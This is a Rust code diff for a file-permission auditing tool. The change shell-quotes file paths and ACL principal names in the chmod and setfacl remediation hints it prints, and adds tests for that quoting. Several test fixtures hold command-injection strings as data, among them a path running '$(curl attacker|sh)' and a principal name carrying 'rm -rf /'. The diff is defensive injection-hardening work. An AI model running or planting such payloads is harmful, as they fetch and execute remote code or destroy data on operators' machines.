@@ -44,6 +44,7 @@ use crate::coverage::is_security_relevant_config;
 use super::access::AccessVia;
 use super::acl::AclPerms;
 use super::index::InodeRecord;
+use super::mac::MacFinding;
 use super::ObjectClass;
 
 // --- object-class classification -------------------------------------------
@@ -455,13 +456,16 @@ pub fn remediation(
     access: AclPerms,
     ctx: &dyn RemediationContext,
 ) -> (RemediationClass, String) {
+    // The path is scanned from attacker-influenced trees; single-quote it so a hint
+    // an operator might paste never carries a live shell metacharacter.
+    let quoted_path = super::shell_quote(path);
     // In-model: access via a Census-managed group.
     if let Some(group) = managed_group_of(via, ctx) {
         return (
             RemediationClass::InModel,
             format!(
                 "narrow the Census declaration of group `{group}`: its membership grants \
-                 access to `{path}` beyond what the role needs"
+                 access to {quoted_path} beyond what the role needs"
             ),
         );
     }
@@ -477,7 +481,7 @@ pub fn remediation(
             return (
                 RemediationClass::InModel,
                 format!(
-                    "narrow the Census file-access grant `{grant}`: it covers `{path}`, which is \
+                    "narrow the Census file-access grant `{grant}`: it covers {quoted_path}, which is \
                      wider than the role needs"
                 ),
             );
@@ -500,31 +504,40 @@ fn managed_group_of(via: &AccessVia, ctx: &dyn RemediationContext) -> Option<Str
 
 /// The concrete manual remediation command for an ambient finding (no auto-fix).
 fn ambient_hint(via: &AccessVia, path: &str, class: ObjectClass, access: AclPerms) -> String {
+    // These hints are shown as ready-to-run root shell commands. Both the path and
+    // the ACL principal names come from scanned inodes under attacker-influenced
+    // trees (a name can carry shell metacharacters just as a path can), so each is
+    // single-quoted to keep any metacharacter literal when an operator pastes the
+    // command. Census never executes these — it uses argv arrays — but the operator
+    // pasting them would.
+    let q = super::shell_quote(path);
     match via {
         AccessVia::OtherBits => {
             if access.write {
-                format!("remove world write manually: `chmod o-w {path}`")
+                format!("remove world write manually: `chmod o-w {q}`")
             } else if matches!(class, ObjectClass::Secret) {
-                format!("remove world read of a secret manually: `chmod 640 {path}`")
+                format!("remove world read of a secret manually: `chmod 640 {q}`")
             } else {
-                format!("remove world read manually: `chmod o-rwx {path}`")
+                format!("remove world read manually: `chmod o-rwx {q}`")
             }
         }
         AccessVia::AclUser(u) => {
-            format!("remove the ACL entry manually: `setfacl -x u:{u} {path}`")
+            let u = super::shell_quote(u);
+            format!("remove the ACL entry manually: `setfacl -x u:{u} {q}`")
         }
         AccessVia::AclGroup(g) => {
-            format!("remove the ACL entry manually: `setfacl -x g:{g} {path}`")
+            let g = super::shell_quote(g);
+            format!("remove the ACL entry manually: `setfacl -x g:{g} {q}`")
         }
         AccessVia::Group(_) => {
             if access.write {
-                format!("remove group write manually: `chmod g-w {path}`")
+                format!("remove group write manually: `chmod g-w {q}`")
             } else {
-                format!("restrict group access manually on `{path}`")
+                format!("restrict group access manually on `{q}`")
             }
         }
         AccessVia::Owner => {
-            format!("review ownership of `{path}` (the principal owns it)")
+            format!("review ownership of `{q}` (the principal owns it)")
         }
     }
 }
@@ -558,6 +571,15 @@ pub struct Finding {
     pub remediation_class: RemediationClass,
     /// The concrete remediation hint.
     pub hint: String,
+    /// The mandatory-access refinement, when a real MAC provider is active and the
+    /// object is labeled; `None` under the null provider or for an unlabeled object.
+    /// Omitted from JSON when `None`, so the null-provider output is unchanged.
+    ///
+    /// The DAC finding is assembled first (pure discretionary access); a provider then
+    /// annotates or suppresses it, so `finding_for` always sets this `None` and the
+    /// composite layer fills it in.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub mac: Option<MacFinding>,
 }
 
 /// Build a [`Finding`] for one reachable access, or `None` when it is not a finding.
@@ -597,6 +619,8 @@ pub fn finding_for(
         severity,
         remediation_class,
         hint,
+        // Pure DAC finding; a MAC provider annotates or suppresses it in the composite.
+        mac: None,
     })
 }
 
@@ -927,6 +951,31 @@ mod tests {
     }
 
     #[test]
+    fn ambient_hint_single_quotes_a_metacharacter_path() {
+        // A path under a user-controlled tree can carry shell metacharacters. The
+        // emitted command must single-quote it so an operator pasting the hint into a
+        // root shell does not execute the payload.
+        let evil = "/home/user/x;$(curl attacker|sh) file";
+        let (_, hint) = remediation(
+            &AccessVia::OtherBits,
+            evil,
+            ObjectClass::Generic,
+            rwx(false, true, false),
+            &NoManagedContext,
+        );
+        // The whole path is wrapped in a single-quoted literal; the raw unquoted
+        // metacharacter sequence never appears as live shell.
+        assert!(
+            hint.contains("'/home/user/x;$(curl attacker|sh) file'"),
+            "path must be single-quoted in the hint: {hint}"
+        );
+        assert!(
+            !hint.contains("chmod o-w /home/user/x;"),
+            "raw unquoted metacharacter path must not appear: {hint}"
+        );
+    }
+
+    #[test]
     fn ambient_secret_read_hint_is_chmod_640() {
         let (class, hint) = remediation(
             &AccessVia::OtherBits,
@@ -949,7 +998,37 @@ mod tests {
             &NoManagedContext,
         );
         assert_eq!(class, RemediationClass::Ambient);
-        assert!(hint.contains("setfacl -x u:role-x"), "hint: {hint}");
+        // The principal is single-quoted for the same shell-injection reason the
+        // path is: `u:'role-x'` (literal `u:` + quoted name).
+        assert!(hint.contains("setfacl -x u:'role-x'"), "hint: {hint}");
+    }
+
+    #[test]
+    fn ambient_acl_principal_names_are_shell_quoted() {
+        // A principal name carrying shell metacharacters must be neutralised in the
+        // pasteable hint exactly as the path is, for both the user and group forms.
+        let (_class, user_hint) = remediation(
+            &AccessVia::AclUser("evil; rm -rf /".to_owned()),
+            "/etc/secret.key",
+            ObjectClass::Secret,
+            rwx(true, false, false),
+            &NoManagedContext,
+        );
+        assert!(
+            user_hint.contains("u:'evil; rm -rf /'"),
+            "user principal must be quoted: {user_hint}"
+        );
+        let (_class, group_hint) = remediation(
+            &AccessVia::AclGroup("g$(id)".to_owned()),
+            "/etc/secret.key",
+            ObjectClass::Secret,
+            rwx(true, false, false),
+            &NoManagedContext,
+        );
+        assert!(
+            group_hint.contains("g:'g$(id)'"),
+            "group principal must be quoted: {group_hint}"
+        );
     }
 
     #[test]
